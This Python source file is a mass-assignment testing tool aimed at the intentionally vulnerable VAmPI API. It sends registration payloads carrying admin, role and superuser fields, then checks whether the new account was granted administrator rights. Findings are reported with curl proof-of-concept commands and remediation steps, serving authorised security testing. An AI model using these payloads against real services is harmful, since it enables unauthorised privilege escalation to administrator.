"""
tools/mass_assignment_tester.py
================================
Security Tool 5 — Mass Assignment Vulnerability Testing

Tests for OWASP API6:2019 Mass Assignment.

VAmPI-specific target
----------------------
``POST /users/v1/register`` — Known to accept and apply ``admin`` field,
allowing any user to self-promote to administrator during registration.

Test strategy
-------------
1. Register a user with ``admin: true`` in the body.
2. Register a user with ``isAdmin: true``.
3. Register a user with ``role: "admin"``.
4. After registration, login and inspect the ``/me`` endpoint or user profile
   to check if admin flag was applied.
5. Test for additional undocumented mass-assignable fields.
"""

from __future__ import annotations

import json
import uuid
from typing import Any, Dict, List, Optional

from models.vulnerability import (
    CVSSScore,
    HTTPEvidence,
    OWASPCategory,
    TestStatus,
    VulnerabilityFinding,
)
from utils.http_client import HTTPClient
from utils.logger import get_logger

logger = get_logger(__name__)

# ---------------------------------------------------------------------------
# Mass-assignment payloads to try
# ---------------------------------------------------------------------------

_ADMIN_PAYLOADS: List[Dict[str, Any]] = [
    {"admin": True},
    {"admin": 1},
    {"isAdmin": True},
    {"is_admin": True},
    {"role": "admin"},
    {"role": "administrator"},
    {"privilege": "admin"},
    {"permissions": ["admin", "write", "read"]},
    {"superuser": True},
    {"staff": True},
]


class MassAssignmentTester:
    """
    Tests for mass assignment vulnerabilities in registration and update endpoints.

    Parameters
    ----------
    client:
        Configured ``HTTPClient`` for the target application.
    base_url:
        Base URL of the target application.
    """

    def __init__(self, client: HTTPClient, base_url: str) -> None:
        self._client = client
        self._base_url = base_url.rstrip("/")
        self._findings: List[VulnerabilityFinding] = []
        self._vuln_counter = 0

    # ── Public interface ────────────────────────────────────────────────────

    def run(self) -> List[VulnerabilityFinding]:
        """Execute all mass assignment tests and return findings."""
        logger.info("MassAssignmentTester: starting tests")
        self._test_admin_registration()
        self._test_extra_fields_preserved()
        logger.info("MassAssignmentTester: complete", findings=len(self._findings))
        return self._findings

    # ── Test: Admin flag via registration ──────────────────────────────────

    def _test_admin_registration(self) -> None:
        """
        Test 1: Register a user with admin=True and check if the flag is applied.

        VAmPI is known to accept ``admin: true`` during registration and store it
        in the database without validation.
        """
        for extra_fields in _ADMIN_PAYLOADS:
            suffix = uuid.uuid4().hex[:8]
            username = f"mass_{suffix}"
            password = "MassTest@2024!"
            email = f"{username}@test.invalid"

            reg_body = {
                "username": username,
                "password": password,
                "email": email,
                **extra_fields,
            }

            # Attempt registration with admin fields
            reg_resp = self._client.post(
                "/users/v1/register",
                json=reg_body,
                headers={"Content-Type": "application/json"},
            )

            reg_ev = HTTPEvidence(
                method="POST",
                url=f"{self._base_url}/users/v1/register",
                request_body={**reg_body, "password": "***"},
                response_status=reg_resp.status_code,
                response_body=self._safe_json(reg_resp.text),
            )

            if reg_resp.status_code not in (200, 201):
                continue

            # Login as the newly registered user
            login_resp = self._client.post(
                "/users/v1/login",
                json={"username": username, "password": password},
                headers={"Content-Type": "application/json"},
            )

            if login_resp.status_code != 200:
                continue

            login_data = self._safe_json(login_resp.text)
            jwt = (
                (login_data or {}).get("auth_token")
                or (login_data or {}).get("token")
                or (login_data or {}).get("access_token")
            )

            if not jwt:
                continue

            # Check /me or user profile for admin flag
            admin_confirmed = False
            profile_ev = None

            for check_path in [f"/users/v1/{username}", "/me"]:
                profile_resp = self._client.get(
                    check_path,
                    headers={"Authorization": f"Bearer {jwt}"},
                )
                if profile_resp.status_code == 200:
                    profile_data = self._safe_json(profile_resp.text)
                    profile_ev = HTTPEvidence(
                        method="GET",
                        url=f"{self._base_url}{check_path}",
                        request_headers={"Authorization": "Bearer <JWT>"},
                        response_status=profile_resp.status_code,
                        response_body=profile_data,
                    )

                    # Check if admin flag is true in profile
                    if self._check_admin_in_response(profile_data):
                        admin_confirmed = True
                        break

            # Also check registration response itself
            if not admin_confirmed:
                if self._check_admin_in_response(self._safe_json(reg_resp.text)):
                    admin_confirmed = True

            if admin_confirmed:
                extra_fields_str = json.dumps(extra_fields)
                evidence = [reg_ev]
                if profile_ev:
                    evidence.append(profile_ev)

                self._add_finding(
                    title="Mass Assignment — Admin Privilege Escalation via Registration",
                    owasp=OWASPCategory.API6_MASS_ASSIGNMENT,
                    endpoint="/users/v1/register",
                    method="POST",
                    cvss=CVSSScore.from_score(
                        9.8,
                        "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                    ),
                    status=TestStatus.VULNERABLE,
                    confirmed=True,
                    description=(
                        f"The registration endpoint accepted the extra field(s) {extra_fields_str} "
                        f"and applied them to the user's account. "
                        f"The user '{username}' was registered with admin privileges "
                        f"by including {extra_fields_str} in the registration payload."
                    ),
                    impact=(
                        "Any unauthenticated user can self-register as an administrator, "
                        "gaining full administrative access to the application."
                    ),
                    poc=(
                        "curl -X POST {base}/users/v1/register \\\n"
                        "  -H 'Content-Type: application/json' \\\n"
                        "  -d '{payload}'\n"
                        "# Then login as 'hacker' — admin=true confirmed in profile"
                    ).format(
                        base=self._base_url,
                        payload=json.dumps(
                            {"username": "hacker", "password": "pass",
                             "email": "h@x.com", **extra_fields}
                        ),
                    ),
                    evidence=evidence,
                    remediation=[
                        "Use a whitelist of allowed registration fields: only username, email, password.",
                        "Never bind request body directly to the user model/ORM object.",
                        "Implement explicit field assignment instead of bulk update patterns.",
                        "Validate and reject any extra fields not in the allowed whitelist.",
                        "Use a dedicated registration DTO that excludes admin/role fields.",
                    ],
                )
                return

            else:
                # VAmPI may still be vulnerable even if we can't confirm from profile
                # Check if the registration response mentions admin
                reg_text = (reg_resp.text or "").lower()
                if "admin" in reg_text and json.dumps(extra_fields).replace('"', '').lower() in reg_text:
                    self._add_finding(
                        title="Potential Mass Assignment — Admin Field Accepted at Registration",
                        owasp=OWASPCategory.API6_MASS_ASSIGNMENT,
                        endpoint="/users/v1/register",
                        method="POST",
                        cvss=CVSSScore.from_score(
                            9.8,
                            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                        ),
                        status=TestStatus.LIKELY,
                        confirmed=False,
                        description=(
                            f"Registration endpoint accepted extra field(s) {json.dumps(extra_fields)} "
                            "without rejection. Manual verification recommended to confirm admin promotion."
                        ),
                        impact="Potential admin privilege escalation via mass assignment.",
                        poc=(
                            "curl -X POST {base}/users/v1/register \\\n"
                            "  -d '{payload}'"
                        ).format(
                            base=self._base_url,
                            payload=json.dumps(
                                {"username": "hacker", "password": "pass",
                                 "email": "h@x.com", **extra_fields}
                            ),
                        ),
                        evidence=[reg_ev],
                        remediation=[
                            "Whitelist only allowed registration fields.",
                            "Reject any extra fields with HTTP 400.",
                        ],
                    )
                    return

        logger.info("MassAssignmentTester: admin mass assignment not confirmed")

    # ── Test: Extra fields preserved in response ───────────────────────────

    def _test_extra_fields_preserved(self) -> None:
        """
        Test 2: Submit unexpected fields during registration and check if they
        appear in profile responses (indicating mass assignment storage).
        """
        suffix = uuid.uuid4().hex[:8]
        username = f"extra_{suffix}"
        canary_value = f"canary_{uuid.uuid4().hex[:8]}"

        reg_body = {
            "username": username,
            "password": "ExtraTest@2024!",
            "email": f"{username}@test.invalid",
            "custom_field": canary_value,
            "internal_notes": "injected_field",
        }

        reg_resp = self._client.post(
            "/users/v1/register",
            json=reg_body,
            headers={"Content-Type": "application/json"},
        )

        if reg_resp.status_code not in (200, 201):
            return

        # Login and check profile for canary
        login_resp = self._client.post(
            "/users/v1/login",
            json={"username": username, "password": "ExtraTest@2024!"},
            headers={"Content-Type": "application/json"},
        )

        if login_resp.status_code != 200:
            return

        login_data = self._safe_json(login_resp.text)
        jwt = (login_data or {}).get("auth_token") or (login_data or {}).get("token")
        if not jwt:
            return

        profile_resp = self._client.get(
            f"/users/v1/{username}",
            headers={"Authorization": f"Bearer {jwt}"},
        )

        if profile_resp.status_code == 200:
            profile_text = (profile_resp.text or "").lower()
            if canary_value in profile_text or "custom_field" in profile_text:
                self._add_finding(
                    title="Mass Assignment — Arbitrary Fields Stored and Returned",
                    owasp=OWASPCategory.API6_MASS_ASSIGNMENT,
                    endpoint="/users/v1/register",
                    method="POST",
                    cvss=CVSSScore.from_score(
                        7.5,
                        "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
                    ),
                    status=TestStatus.VULNERABLE,
                    confirmed=True,
                    description=(
                        "The registration endpoint stored arbitrary custom fields "
                        f"(custom_field='{canary_value}') that were later returned in the profile. "
                        "This confirms mass assignment vulnerability."
                    ),
                    impact="Attackers can inject arbitrary data fields into user records.",
                    poc=(
                        f"# Register with extra field:\n"
                        f"POST /users/v1/register + {{\"custom_field\":\"{canary_value}\"}}\n"
                        f"# Check profile — field is persisted"
                    ),
                    evidence=[
                        HTTPEvidence(
                            method="GET",
                            url=f"{self._base_url}/users/v1/{username}",
                            response_status=profile_resp.status_code,
                            response_body=self._safe_json(profile_resp.text),
                        )
                    ],
                    remediation=[
                        "Use explicit field whitelisting in registration handler.",
                        "Never use ORM bulk-assign (model(**request_body)) pattern.",
                    ],
                )

    # ── Helpers ─────────────────────────────────────────────────────────────

    def _check_admin_in_response(self, data: Any) -> bool:
        """Check if admin=true (or truthy equivalent) is in the response."""
        if data is None:
            return False
        data_str = json.dumps(data).lower()
        admin_patterns = [
            '"admin": true', '"admin":true',
            '"is_admin": true', '"isadmin": true',
            '"admin": 1', '"role": "admin"',
        ]
        return any(p in data_str for p in admin_patterns)

    def _next_vuln_id(self) -> str:
        self._vuln_counter += 1
        return f"MASS-{self._vuln_counter:03d}"

    def _add_finding(self, title, owasp, endpoint, method, cvss, status,
                     confirmed, description, impact, poc, evidence, remediation) -> None:
        finding = VulnerabilityFinding(
            vuln_id=self._next_vuln_id(), title=title, owasp_category=owasp,
            endpoint=endpoint, method=method, cvss=cvss, status=status,
            confirmed=confirmed, description=description, impact=impact,
            proof_of_concept=poc, evidence=evidence, remediation=remediation,
            references=["https://owasp.org/API-Security/editions/2019/en/0xa6-mass-assignment/"],
        )
        self._findings.append(finding)
        logger.info("MassAssignmentTester: finding added", title=title, severity=cvss.severity.value)

    @staticmethod
    def _safe_json(text: str) -> Any:
        try:
            return json.loads(text)
        except Exception:
            return text[:500] if text else None
